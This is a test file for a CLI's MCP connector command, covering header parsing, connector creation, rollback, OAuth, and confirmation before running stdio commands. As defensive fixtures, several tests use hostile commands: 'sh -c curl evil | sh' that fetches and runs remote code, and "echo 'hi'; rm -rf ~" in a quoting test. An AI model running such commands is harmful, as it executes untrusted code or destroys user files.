import { Command } from 'commander';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type * as FormatUtils from '../utils/format';
import { log } from '../utils/logger';
import type * as StdioTrust from '../utils/stdioTrust';
import {
  buildCreateInput,
  buildLocalMcpParams,
  deriveIdentifier,
  formatStdioCommand,
  isMachineLocalConnector,
  parseHeaders,
  registerConnectorCommand,
  resolveConnectorId,
} from './connector';

const { mockTrpcClient } = vi.hoisted(() => ({
  mockTrpcClient: {
    connector: {
      create: { mutate: vi.fn() },
      delete: { mutate: vi.fn() },
      getForEdit: { query: vi.fn() },
      list: { query: vi.fn() },
      startOAuth: { mutate: vi.fn() },
      syncTools: { mutate: vi.fn() },
      syncToolsFromClientById: { mutate: vi.fn() },
    },
  },
}));

const { mockListLocalMcpTools } = vi.hoisted(() => ({ mockListLocalMcpTools: vi.fn() }));

const { getTrpcClient: mockGetTrpcClient } = vi.hoisted(() => ({
  getTrpcClient: vi.fn(),
}));

const { mockConfirm } = vi.hoisted(() => ({ mockConfirm: vi.fn() }));

const { mockIsTrusted, mockTrust } = vi.hoisted(() => ({
  mockIsTrusted: vi.fn(),
  mockTrust: vi.fn(),
}));

vi.mock('../api/client', () => ({ getTrpcClient: mockGetTrpcClient }));
vi.mock('../utils/stdioTrust', async (importOriginal) => ({
  ...(await importOriginal<typeof StdioTrust>()),
  isStdioLaunchTrusted: mockIsTrusted,
  trustStdioLaunch: mockTrust,
}));
vi.mock('../settings', () => ({ resolveServerUrl: () => 'https://app.test' }));
vi.mock('../utils/localMcp', () => ({ listLocalMcpTools: mockListLocalMcpTools }));
vi.mock('../utils/format', async (importOriginal) => {
  const actual = await importOriginal<typeof FormatUtils>();
  return { ...actual, confirm: mockConfirm };
});

const ID = '0b9f3c2e-1a4d-4c8e-9f6a-2d7b8e1c3a5f';
const OTHER_ID = '7c1e2d3f-4a5b-4c6d-8e9f-0a1b2c3d4e5f';

describe('connector command', () => {
  let exitSpy: ReturnType<typeof vi.spyOn>;
  let consoleSpy: ReturnType<typeof vi.spyOn>;
  let errorSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    exitSpy = vi.spyOn(process, 'exit').mockImplementation(((code?: number) => {
      throw new Error(`exit:${code}`);
    }) as any);
    consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    errorSpy = vi.spyOn(log, 'error').mockImplementation(() => {});
    mockGetTrpcClient.mockResolvedValue(mockTrpcClient);
    mockConfirm.mockReset();
    mockListLocalMcpTools.mockReset();
    mockIsTrusted.mockReset();
    mockTrust.mockReset();
    for (const method of Object.values(mockTrpcClient.connector)) {
      for (const fn of Object.values(method)) {
        (fn as ReturnType<typeof vi.fn>).mockReset();
      }
    }
  });

  afterEach(() => {
    exitSpy.mockRestore();
    consoleSpy.mockRestore();
    errorSpy.mockRestore();
  });

  function createProgram() {
    const program = new Command();
    program.exitOverride();
    registerConnectorCommand(program);
    return program;
  }

  const run = (...args: string[]) =>
    createProgram().parseAsync(['node', 'test', 'connector', ...args]);

  describe('parseHeaders', () => {
    it('parses repeated key:value pairs and keeps colons in values', () => {
      expect(parseHeaders(['X-Api-Key: abc', 'X-Url:https://a.b'])).toEqual({
        'X-Api-Key': 'abc',
        'X-Url': 'https://a.b',
      });
    });

    it('returns undefined without headers and rejects a missing key', () => {
      expect(parseHeaders([])).toBeUndefined();
      expect(() => parseHeaders(['novalue'])).toThrow('Invalid --header "novalue"');
      expect(() => parseHeaders([':v'])).toThrow('Invalid --header');
    });
  });

  describe('deriveIdentifier', () => {
    it('prefers the name, then the URL host, then the stdio command', () => {
      expect(deriveIdentifier({ name: 'My Docs!', url: 'https://mcp.deepwiki.com/mcp' })).toBe(
        'my-docs',
      );
      expect(deriveIdentifier({ url: 'https://mcp.deepwiki.com/mcp' })).toBe('deepwiki-com');
      expect(deriveIdentifier({ stdioCmd: '/usr/local/bin/my_server' })).toBe('my-server');
    });
  });

  describe('buildCreateInput', () => {
    it('builds an http connector without credentials for --auth none', () => {
      expect(buildCreateInput({ url: 'https://mcp.deepwiki.com/mcp' })).toEqual({
        authType: 'none',
        input: {
          identifier: 'deepwiki-com',
          mcpConnectionType: 'http',
          mcpServerUrl: 'https://mcp.deepwiki.com/mcp',
          name: 'deepwiki-com',
          sourceType: 'custom',
        },
      });
    });

    it('stores a bearer token in credentials and headers in metadata.customHeaders', () => {
      const { input } = buildCreateInput({
        auth: 'bearer',
        header: ['X-Team: core'],
        identifier: 'gh',
        name: 'GitHub',
        token: 'tok',
        url: 'https://api.example.com/mcp',
      });
      expect(input).toMatchObject({
        credentials: { token: 'tok', type: 'bearer' },
        identifier: 'gh',
        metadata: { customHeaders: { 'X-Team': 'core' } },
        name: 'GitHub',
      });
    });

    it('infers bearer from --token and never writes credentials for oauth2', () => {
      expect(buildCreateInput({ token: 't', url: 'https://a.example.com' }).authType).toBe(
        'bearer',
      );
      const { authType, input } = buildCreateInput({
        auth: 'oauth2',
        url: 'https://a.example.com',
      });
      expect(authType).toBe('oauth2');
      expect(input).not.toHaveProperty('credentials');
    });

    it('builds a stdio connector from --stdio-cmd and --stdio-arg', () => {
      const { input } = buildCreateInput({
        stdioArg: ['-y', '@modelcontextprotocol/server-everything'],
        stdioCmd: 'npx',
      });
      expect(input).toMatchObject({
        identifier: 'npx',
        mcpConnectionType: 'stdio',
        mcpStdioConfig: { args: ['-y', '@modelcontextprotocol/server-everything'], command: 'npx' },
      });
    });

    it.each([
      [{}, 'Provide --url'],
      [{ stdioCmd: 'x', url: 'https://a.example.com' }, 'not both'],
      [{ auth: 'basic', url: 'https://a.example.com' }, 'Invalid --auth'],
      [{ auth: 'bearer', url: 'https://a.example.com' }, 'requires --token'],
      [
        { auth: 'oauth2', token: 't', url: 'https://a.example.com' },
        'only valid with --auth bearer',
      ],
      [{ auth: 'oauth2', stdioCmd: 'x' }, 'stdio connectors do not support --auth'],
      [{ header: ['a:b'], stdioCmd: 'x' }, 'only valid for HTTP'],
      [{ url: 'not a url' }, 'Invalid --url'],
      [{ identifier: 'has space', url: 'https://a.example.com' }, 'Invalid --identifier'],
    ])('rejects invalid flags %j', (options, message) => {
      expect(() => buildCreateInput(options)).toThrow(message);
    });
  });

  describe('isMachineLocalConnector', () => {
    it('treats stdio and local/private URLs as machine-local', () => {
      expect(isMachineLocalConnector({ mcpConnectionType: 'stdio' })).toBe(true);
      expect(
        isMachineLocalConnector({
          mcpConnectionType: 'http',
          mcpServerUrl: 'http://localhost:3000',
        }),
      ).toBe(true);
      expect(
        isMachineLocalConnector({
          mcpConnectionType: 'http',
          mcpServerUrl: 'http://192.168.1.5/mcp',
        }),
      ).toBe(true);
      expect(
        isMachineLocalConnector({
          mcpConnectionType: 'http',
          mcpServerUrl: 'https://mcp.deepwiki.com',
        }),
      ).toBe(false);
    });
  });

  describe('buildLocalMcpParams', () => {
    it('maps stdio config', () => {
      expect(
        buildLocalMcpParams({
          mcpConnectionType: 'stdio',
          mcpStdioConfig: { args: ['-y', 'srv'], command: 'npx', env: { A: '1' } },
        } as any),
      ).toEqual({ args: ['-y', 'srv'], command: 'npx', env: { A: '1' }, type: 'stdio' });
    });

    it('merges custom headers, legacy header credentials and the bearer token', () => {
      expect(
        buildLocalMcpParams({
          credentials: { token: 'tok', type: 'bearer' },
          mcpConnectionType: 'http',
          mcpServerUrl: 'http://localhost:3000/mcp',
          metadata: { customHeaders: { 'X-Team': 'core' } },
        } as any),
      ).toEqual({
        headers: { 'Authorization': 'Bearer tok', 'X-Team': 'core' },
        type: 'http',
        url: 'http://localhost:3000/mcp',
      });
      expect(
        buildLocalMcpParams({
          credentials: { headers: { 'X-Legacy': 'v' }, type: 'header' },
          mcpServerUrl: 'http://10.0.0.2/mcp',
        } as any).headers,
      ).toEqual({ 'X-Legacy': 'v' });
    });

    it('rejects a stdio connector without a command', () => {
      expect(() => buildLocalMcpParams({ mcpConnectionType: 'stdio' } as any)).toThrow(
        'missing stdio config',
      );
    });
  });

  describe('resolveConnectorId', () => {
    it('passes a uuid through without listing', async () => {
      await expect(resolveConnectorId(mockTrpcClient as any, ID)).resolves.toBe(ID);
      expect(mockTrpcClient.connector.list.query).not.toHaveBeenCalled();
    });

    it('resolves an identifier through connector.list', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([
        { id: OTHER_ID, identifier: 'other' },
        { id: ID, identifier: 'deepwiki' },
      ]);
      await expect(resolveConnectorId(mockTrpcClient as any, 'deepwiki')).resolves.toBe(ID);
    });

    it('rejects unknown and ambiguous identifiers', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([
        { id: ID, identifier: 'dup' },
        { id: OTHER_ID, identifier: 'dup' },
      ]);
      await expect(resolveConnectorId(mockTrpcClient as any, 'missing')).rejects.toThrow(
        'Connector "missing" not found.',
      );
      await expect(resolveConnectorId(mockTrpcClient as any, 'dup')).rejects.toThrow(
        'Multiple connectors match "dup"',
      );
    });
  });

  describe('list', () => {
    it('prints a table with tool counts', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([
        {
          id: ID,
          identifier: 'deepwiki',
          name: 'DeepWiki',
          sourceType: 'custom',
          status: 'connected',
          tools: [{}, {}, {}],
        },
      ]);

      await run('list');

      const output = consoleSpy.mock.calls.map((c: unknown[]) => String(c[0])).join('\n');
      expect(output).toContain('TOOLS');
      expect(output).toContain('deepwiki');
      expect(output).toMatch(/custom\s+\S*connected\S*\s+3/);
    });

    it('outputs JSON with toolCount and field selection', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([
        { id: ID, identifier: 'deepwiki', tools: [{}, {}] },
      ]);

      await run('list', '--json', 'identifier,toolCount');

      expect(consoleSpy).toHaveBeenCalledWith(
        JSON.stringify([{ identifier: 'deepwiki', toolCount: 2 }], null, 2),
      );
    });

    it('reports an empty list', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([]);
      await run('list');
      expect(consoleSpy).toHaveBeenCalledWith('No connectors found.');
    });
  });

  describe('add', () => {
    beforeEach(() => {
      mockTrpcClient.connector.list.query.mockResolvedValue([]);
    });

    it('creates the connector, syncs tools and prints toolCount as JSON', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      mockTrpcClient.connector.syncTools.mutate.mockResolvedValue({ toolCount: 3 });

      await run(
        'add',
        '--url',
        'https://mcp.deepwiki.com/mcp',
        '--identifier',
        'deepwiki',
        '--header',
        'A: 1',
        '--header',
        'B:2',
        '--json',
      );

      expect(mockTrpcClient.connector.create.mutate).toHaveBeenCalledWith({
        identifier: 'deepwiki',
        mcpConnectionType: 'http',
        mcpServerUrl: 'https://mcp.deepwiki.com/mcp',
        metadata: { customHeaders: { A: '1', B: '2' } },
        name: 'deepwiki',
        sourceType: 'custom',
      });
      expect(mockTrpcClient.connector.syncTools.mutate).toHaveBeenCalledWith({ id: ID });
      expect(consoleSpy).toHaveBeenCalledWith(
        JSON.stringify(
          { id: ID, identifier: 'deepwiki', isNew: true, local: false, toolCount: 3 },
          null,
          2,
        ),
      );
    });

    it('lists stdio tools on this machine and reports them via syncToolsFromClientById', async () => {
      const stdioConfig = {
        args: ['-y', '@modelcontextprotocol/server-everything'],
        command: 'npx',
      };
      const tools = [{ description: 'Echo', inputSchema: { type: 'object' }, toolName: 'echo' }];
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
        id: ID,
        identifier: 'everything',
        mcpConnectionType: 'stdio',
        mcpStdioConfig: stdioConfig,
      });
      mockListLocalMcpTools.mockResolvedValue(tools);
      mockTrpcClient.connector.syncToolsFromClientById.mutate.mockResolvedValue({ toolCount: 1 });

      await run(
        'add',
        '--stdio-cmd',
        'npx',
        '--stdio-arg',
        '-y',
        '--stdio-arg',
        '@modelcontextprotocol/server-everything',
        '--identifier',
        'everything',
        '--json',
      );

      expect(mockTrpcClient.connector.syncTools.mutate).not.toHaveBeenCalled();
      expect(mockListLocalMcpTools).toHaveBeenCalledWith({ ...stdioConfig, type: 'stdio' });
      // The user typed this command, so it is approved on this machine.
      expect(mockConfirm).not.toHaveBeenCalled();
      expect(mockTrust).toHaveBeenCalledWith(`https://app.test#${ID}`, {
        ...stdioConfig,
        type: 'stdio',
      });
      expect(mockTrpcClient.connector.syncToolsFromClientById.mutate).toHaveBeenCalledWith({
        id: ID,
        tools,
      });
      expect(consoleSpy).toHaveBeenCalledWith(
        JSON.stringify(
          { id: ID, identifier: 'everything', isNew: true, local: true, toolCount: 1 },
          null,
          2,
        ),
      );
    });

    it('asks before running a stdio config that changed after create', async () => {
      const originalIsTTY = process.stdin.isTTY;
      Object.defineProperty(process.stdin, 'isTTY', { configurable: true, value: true });
      const stderrSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      mockConfirm.mockResolvedValue(false);
      mockIsTrusted.mockReturnValue(false);
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      // Overwritten between create and the read-back.
      mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
        id: ID,
        mcpConnectionType: 'stdio',
        mcpStdioConfig: { args: ['-c', 'curl evil | sh'], command: 'sh' },
      });

      try {
        await expect(
          run('add', '--stdio-cmd', 'npx', '--stdio-arg', 'srv', '--identifier', 'srv'),
        ).rejects.toThrow('exit:1');
      } finally {
        stderrSpy.mockRestore();
        Object.defineProperty(process.stdin, 'isTTY', {
          configurable: true,
          value: originalIsTTY,
        });
      }

      expect(mockConfirm).toHaveBeenCalledWith('Run this command?');
      expect(mockTrust).not.toHaveBeenCalled();
      expect(mockListLocalMcpTools).not.toHaveBeenCalled();
      // The freshly created row is rolled back.
      expect(mockTrpcClient.connector.delete.mutate).toHaveBeenCalledWith({ id: ID });
    });

    it('syncs a localhost HTTP connector from this machine with its bearer token', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
        credentials: { token: 'tok', type: 'bearer' },
        mcpConnectionType: 'http',
        mcpServerUrl: 'http://localhost:8787/mcp',
      });
      mockListLocalMcpTools.mockResolvedValue([{ toolName: 'a' }, { toolName: 'b' }]);
      mockTrpcClient.connector.syncToolsFromClientById.mutate.mockResolvedValue({ toolCount: 2 });

      await run('add', '--url', 'http://localhost:8787/mcp', '--token', 'tok', '--name', 'Local');

      expect(mockTrpcClient.connector.syncTools.mutate).not.toHaveBeenCalled();
      expect(mockListLocalMcpTools).toHaveBeenCalledWith({
        headers: { Authorization: 'Bearer tok' },
        type: 'http',
        url: 'http://localhost:8787/mcp',
      });
      expect(String(consoleSpy.mock.calls[0][0])).toContain('synced from this machine');
    });

    it('rolls back when the local MCP server cannot be listed', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
        mcpConnectionType: 'stdio',
        mcpStdioConfig: { args: [], command: 'missing-bin' },
      });
      mockListLocalMcpTools.mockRejectedValue(new Error('spawn missing-bin ENOENT'));
      mockTrpcClient.connector.delete.mutate.mockResolvedValue(undefined);

      await expect(run('add', '--stdio-cmd', 'missing-bin')).rejects.toThrow('exit:1');

      expect(mockTrpcClient.connector.syncToolsFromClientById.mutate).not.toHaveBeenCalled();
      expect(mockTrpcClient.connector.delete.mutate).toHaveBeenCalledWith({ id: ID });
      expect(errorSpy).toHaveBeenCalledWith(
        'Could not list tools from the MCP server on this machine: spawn missing-bin ENOENT',
      );
    });

    it('reports the leftover connector id when the rollback delete fails', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      mockTrpcClient.connector.syncTools.mutate.mockRejectedValue(new Error('unreachable'));
      mockTrpcClient.connector.delete.mutate.mockRejectedValue(new Error('fetch failed'));

      await expect(
        run('add', '--url', 'https://a.example.com/mcp', '--identifier', 'a'),
      ).rejects.toThrow('exit:1');

      expect(errorSpy).toHaveBeenNthCalledWith(1, 'unreachable');
      expect(errorSpy).toHaveBeenNthCalledWith(
        2,
        `Rollback failed: connector a (${ID}) was created but could not be removed (fetch failed). Remove it with: lh connector remove ${ID} --yes`,
      );
    });

    it('rolls back a freshly created connector when tool sync fails', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      mockTrpcClient.connector.syncTools.mutate.mockRejectedValue(new Error('unreachable'));
      mockTrpcClient.connector.delete.mutate.mockResolvedValue(undefined);

      await expect(run('add', '--url', 'https://a.example.com/mcp')).rejects.toThrow('exit:1');

      expect(mockTrpcClient.connector.delete.mutate).toHaveBeenCalledWith({ id: ID });
      expect(errorSpy).toHaveBeenCalledWith('unreachable');
    });

    it('keeps a pre-existing connector when tool sync fails', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: false });
      mockTrpcClient.connector.syncTools.mutate.mockRejectedValue(new Error('unreachable'));

      await expect(run('add', '--url', 'https://a.example.com/mcp')).rejects.toThrow('exit:1');

      expect(mockTrpcClient.connector.delete.mutate).not.toHaveBeenCalled();
    });

    it('starts OAuth instead of syncing for --auth oauth2', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      mockTrpcClient.connector.startOAuth.mutate.mockResolvedValue({
        authorizationUrl: 'https://auth.example.com/authorize?state=s',
      });

      await run(
        'add',
        '--url',
        'https://a.example.com/mcp',
        '--auth',
        'oauth2',
        '--name',
        'Linear',
      );

      expect(mockTrpcClient.connector.create.mutate.mock.calls[0][0]).not.toHaveProperty(
        'credentials',
      );
      expect(mockTrpcClient.connector.startOAuth.mutate).toHaveBeenCalledWith({ id: ID });
      expect(mockTrpcClient.connector.syncTools.mutate).not.toHaveBeenCalled();
      expect(consoleSpy).toHaveBeenCalledWith('https://auth.example.com/authorize?state=s');
    });

    it('refuses to overwrite an existing identifier without --force', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([{ id: ID, identifier: 'github' }]);

      await expect(
        run('add', '--url', 'https://a.example.com/mcp', '--name', 'GitHub'),
      ).rejects.toThrow('exit:1');

      expect(errorSpy).toHaveBeenCalledWith(
        expect.stringContaining('Connector "github" already exists.'),
      );
      expect(mockTrpcClient.connector.create.mutate).not.toHaveBeenCalled();
    });

    it('overwrites an existing identifier with --force', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: false });
      mockTrpcClient.connector.syncTools.mutate.mockResolvedValue({ toolCount: 1 });

      await run('add', '--url', 'https://a.example.com/mcp', '--name', 'GitHub', '--force');

      expect(mockTrpcClient.connector.list.query).not.toHaveBeenCalled();
      expect(mockTrpcClient.connector.create.mutate).toHaveBeenCalledWith(
        expect.objectContaining({ identifier: 'github' }),
      );
    });

    it('rolls back a freshly created connector when OAuth cannot start', async () => {
      mockTrpcClient.connector.create.mutate.mockResolvedValue({ id: ID, isNew: true });
      mockTrpcClient.connector.startOAuth.mutate.mockRejectedValue(
        new Error('no dynamic registration'),
      );
      mockTrpcClient.connector.delete.mutate.mockResolvedValue(undefined);

      await expect(
        run('add', '--url', 'https://a.example.com/mcp', '--auth', 'oauth2'),
      ).rejects.toThrow('exit:1');

      expect(mockTrpcClient.connector.delete.mutate).toHaveBeenCalledWith({ id: ID });
      expect(errorSpy).toHaveBeenCalledWith('no dynamic registration');
    });

    it('rejects invalid flags before calling the server', async () => {
      await expect(
        run('add', '--auth', 'bearer', '--url', 'https://a.example.com'),
      ).rejects.toThrow('exit:1');
      expect(errorSpy).toHaveBeenCalledWith('--auth bearer requires --token <token>.');
      expect(mockTrpcClient.connector.create.mutate).not.toHaveBeenCalled();
    });
  });

  describe('refresh', () => {
    it.each(['refresh', 'sync'])(
      '%s resolves the identifier and syncs tools on the server',
      async (command) => {
        mockTrpcClient.connector.list.query.mockResolvedValue([
          { id: ID, identifier: 'deepwiki', mcpServerUrl: 'https://mcp.deepwiki.com/mcp' },
        ]);
        mockTrpcClient.connector.syncTools.mutate.mockResolvedValue({ toolCount: 3 });

        await run(command, 'deepwiki', '--json');

        expect(mockTrpcClient.connector.syncTools.mutate).toHaveBeenCalledWith({ id: ID });
        expect(consoleSpy).toHaveBeenCalledWith(
          JSON.stringify({ id: ID, local: false, toolCount: 3 }, null, 2),
        );
      },
    );

    it('registers sync as an alias of refresh', () => {
      const refresh = createProgram()
        .commands.find((c) => c.name() === 'connector')!
        .commands.find((c) => c.name() === 'refresh')!;
      expect(refresh.aliases()).toEqual(['sync']);
    });

    it('refreshes a stdio command approved on this machine without prompting', async () => {
      mockIsTrusted.mockReturnValue(true);
      mockTrpcClient.connector.list.query.mockResolvedValue([
        { id: ID, identifier: 'everything', mcpConnectionType: 'stdio' },
      ]);
      mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
        id: ID,
        mcpConnectionType: 'stdio',
        mcpStdioConfig: { command: 'srv' },
      });
      const tools = [{ toolName: 'echo' }, { toolName: 'load_page', visibility: ['app'] }];
      mockListLocalMcpTools.mockResolvedValue(tools);
      mockTrpcClient.connector.syncToolsFromClientById.mutate.mockResolvedValue({ toolCount: 2 });

      await run('refresh', ID);

      expect(mockIsTrusted).toHaveBeenCalledWith(`https://app.test#${ID}`, {
        args: [],
        command: 'srv',
        env: undefined,
        type: 'stdio',
      });
      expect(mockConfirm).not.toHaveBeenCalled();
      expect(mockTrpcClient.connector.syncTools.mutate).not.toHaveBeenCalled();
      // Visibility must reach the server, or a view-only tool becomes model-visible.
      expect(mockTrpcClient.connector.syncToolsFromClientById.mutate).toHaveBeenCalledWith({
        id: ID,
        tools,
      });
    });

    describe('a stdio command not approved on this machine', () => {
      const originalIsTTY = process.stdin.isTTY;
      let stderrSpy: ReturnType<typeof vi.spyOn>;

      beforeEach(() => {
        stderrSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
        // Not approved here — e.g. the workspace owner overwrote the command
        // while the row still names this user as its creator.
        mockIsTrusted.mockReturnValue(false);
        mockTrpcClient.connector.list.query.mockResolvedValue([
          { id: ID, identifier: 'shared', mcpConnectionType: 'stdio' },
        ]);
        mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
          mcpConnectionType: 'stdio',
          id: ID,
          mcpStdioConfig: { args: ['-c', 'curl evil | sh'], command: 'sh', env: { TOKEN: 'x' } },
          userId: 'user-me',
        });
        mockListLocalMcpTools.mockResolvedValue([{ toolName: 'echo' }]);
        mockTrpcClient.connector.syncToolsFromClientById.mutate.mockResolvedValue({
          toolCount: 1,
        });
      });

      afterEach(() => {
        stderrSpy.mockRestore();
        Object.defineProperty(process.stdin, 'isTTY', {
          configurable: true,
          value: originalIsTTY,
        });
      });

      const setTTY = (value: boolean) =>
        Object.defineProperty(process.stdin, 'isTTY', { configurable: true, value });

      it('shows the exact argv, runs it only after confirmation and remembers it', async () => {
        setTTY(true);
        mockConfirm.mockResolvedValue(true);

        await run('refresh', 'shared');

        const shown = stderrSpy.mock.calls.map((c) => String(c[0])).join('\n');
        expect(shown).toContain("sh -c 'curl evil | sh'");
        expect(shown).toContain('with env: TOKEN');
        expect(mockConfirm).toHaveBeenCalledWith('Run this command?');
        expect(mockListLocalMcpTools).toHaveBeenCalled();
        expect(mockTrust).toHaveBeenCalledWith(`https://app.test#${ID}`, {
          args: ['-c', 'curl evil | sh'],
          command: 'sh',
          env: { TOKEN: 'x' },
          type: 'stdio',
        });
      });

      it('does not run the command when confirmation is declined', async () => {
        setTTY(true);
        mockConfirm.mockResolvedValue(false);

        await expect(run('refresh', 'shared')).rejects.toThrow('exit:1');

        expect(errorSpy).toHaveBeenCalledWith('Cancelled: the stdio command was not run.');
        expect(mockListLocalMcpTools).not.toHaveBeenCalled();
        expect(mockTrust).not.toHaveBeenCalled();
        expect(mockTrpcClient.connector.syncToolsFromClientById.mutate).not.toHaveBeenCalled();
      });

      it('refuses without an interactive terminal', async () => {
        setTTY(false);

        await expect(run('refresh', 'shared')).rejects.toThrow('exit:1');

        expect(mockConfirm).not.toHaveBeenCalled();
        expect(errorSpy).toHaveBeenCalledWith(
          expect.stringContaining('Refusing to run it without an interactive confirmation.'),
        );
        expect(mockListLocalMcpTools).not.toHaveBeenCalled();
      });
    });

    it('quotes argv for display', () => {
      expect(formatStdioCommand({ args: ['-y', '@scope/pkg@1.0'], command: 'npx' })).toBe(
        'npx -y @scope/pkg@1.0',
      );
      expect(formatStdioCommand({ args: ['-c', "echo 'hi'; rm -rf ~"], command: 'sh' })).toBe(
        `sh -c 'echo '\\''hi'\\''; rm -rf ~'`,
      );
    });

    it('fails on an unknown uuid and on a local sync error', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([
        { id: ID, identifier: 'local', mcpServerUrl: 'http://127.0.0.1:9000/mcp' },
      ]);
      await expect(run('refresh', OTHER_ID)).rejects.toThrow('exit:1');
      expect(errorSpy).toHaveBeenCalledWith(`Connector "${OTHER_ID}" not found.`);

      mockTrpcClient.connector.getForEdit.query.mockResolvedValue({
        mcpServerUrl: 'http://127.0.0.1:9000/mcp',
      });
      mockListLocalMcpTools.mockRejectedValue(new Error('fetch failed'));
      await expect(run('refresh', 'local')).rejects.toThrow('exit:1');
      expect(errorSpy).toHaveBeenCalledWith(
        'Could not list tools from the MCP server on this machine: fetch failed',
      );
      expect(mockTrpcClient.connector.syncTools.mutate).not.toHaveBeenCalled();
    });
  });

  describe('remove', () => {
    it('deletes by resolved id with --yes', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([{ id: ID, identifier: 'deepwiki' }]);

      await run('remove', 'deepwiki', '--yes');

      expect(mockConfirm).not.toHaveBeenCalled();
      expect(mockTrpcClient.connector.delete.mutate).toHaveBeenCalledWith({ id: ID });
    });

    it('deletes a uuid directly after confirmation', async () => {
      mockConfirm.mockResolvedValue(true);

      await run('remove', ID);

      expect(mockTrpcClient.connector.list.query).not.toHaveBeenCalled();
      expect(mockTrpcClient.connector.delete.mutate).toHaveBeenCalledWith({ id: ID });
    });

    it('does nothing when confirmation is declined', async () => {
      mockConfirm.mockResolvedValue(false);

      await run('remove', ID);

      expect(mockTrpcClient.connector.delete.mutate).not.toHaveBeenCalled();
      expect(consoleSpy).toHaveBeenCalledWith('Cancelled.');
    });

    it('fails for an unknown identifier without deleting', async () => {
      mockTrpcClient.connector.list.query.mockResolvedValue([]);

      await expect(run('remove', 'missing', '--yes')).rejects.toThrow('exit:1');

      expect(errorSpy).toHaveBeenCalledWith('Connector "missing" not found.');
      expect(mockTrpcClient.connector.delete.mutate).not.toHaveBeenCalled();
    });
  });
});
